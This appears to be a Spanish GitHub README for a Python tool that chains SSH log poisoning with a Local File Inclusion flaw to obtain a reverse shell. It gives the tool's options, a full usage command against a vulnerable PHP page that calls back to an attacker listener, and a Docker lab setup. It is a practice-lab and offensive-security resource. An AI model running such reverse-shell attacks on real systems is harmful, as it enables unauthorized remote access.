# Log Poisoning SSH → Automated Reverse Shell

[Herramienta](<autopoisonSSH.py>) escrita en **python** que nos permite obtener una **Reverse Shell** de manera automatizada gracias al envenenamiento de los logs relacionados con **SSH** como lo pueden ser el **auth.loh** o **btmp** a través de un **LFI** (Local File Inclusion).

Las opciones disponibles son las siguientes:

```
usage: autoposionSSH.py [-h] -u TARGET_URL -pm TARGET_PARAM -t-ip TARGET_IP -h-ip HOST_IP [-p TARGET_PORT] [-p-ssh TARGET_SSH_PORT] [-l LISTEN_PORT]

☠️ SSH Log Poisoning with LFI → Automated Reverse Shell ☠️

ej: python3 autopoison.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2

options:
  -h, --help                                 show this help message and exit
  -u, --target-url          TARGET_URL       Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php
  -pm, --target-param       TARGET_PARAM     Target parameter with LFI capability - ej: file
  -t-ip, --target-ip        TARGET_IP        Target IP - ej: 172.17.0.2
  -h-ip, --host-ip          HOST_IP          Host IP - ej: 172.17.0.1
   
  -p, --target-port         TARGET_PORT      Target http port                                                         (default =   80)
  -p-ssh, --target-ssh-port TARGET_SSH_PORT  Target ssh port                                                          (default =   22)
  -l, --listen-port         LISTEN_PORT      Listen port                                                              (default = 4444)
```

---
## ¿Por que usar este Proyecto?

En el caso de que queramos explotar un **Log Poisoning** de la manera tradicional nos encontraremos con el inconveniente que vemos en la captura de pantalla por lo que con el uso de este script evitaremos dicho incovenintente gracias a la librería **paramiko** de **python**.

![Pasted image 20240806161520](https://github.com/user-attachments/assets/73c86309-aaa0-442f-afe7-33b87c10b374)

---
## Descarga

Nos clonamos el repositorio de la siguiente forma:
```bash
git clone https://github.com/Trr0r/autopoisonSSH
cd autopoisonSSH
```

Instalamos las librerías necesarias gracias a **pip3**:
```bash
pip3 install -r requirements.txt
```

---
## Uso

En primer lugar debemos detecar la ruta donde se acontecede el **LFI**:

![Pasted image 20240806161403](https://github.com/user-attachments/assets/9238bfd1-c0f2-4eef-abbf-6729aa0457ca)

En segundo y último lugar ejecutaremos el script pasandole los parámetros necesarios tal y como vemos a continuación:

```shell
python3 autopoisonSSH.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2
```

![Pasted image 20241226190954](https://github.com/user-attachments/assets/756a9fed-e7e5-4718-95a6-3975a1e77ca8)

---
## Puesta en Práctica
[Dockerfile](Dockerfile)

docker build -t logpoisoning_image .
docker run -dit --name ssh_logpoisoning logpoisoning_image

---
### Advertencia legal

> [!WARNING]
> Este software está destinado solo para uso personal y debe utilizarse únicamente en entornos controlados y con autorización previa. El empleo de esta herramienta en sistemas o redes sin la debida autorización puede ser ilegal y contravenir políticas de seguridad. El desarrollador no se hace responsable de daños, pérdidas o consecuencias resultantes de su uso inapropiado o no autorizado. Antes de utilizar esta herramienta, asegúrate de cumplir con todas las leyes y regulaciones locales pertinentes.
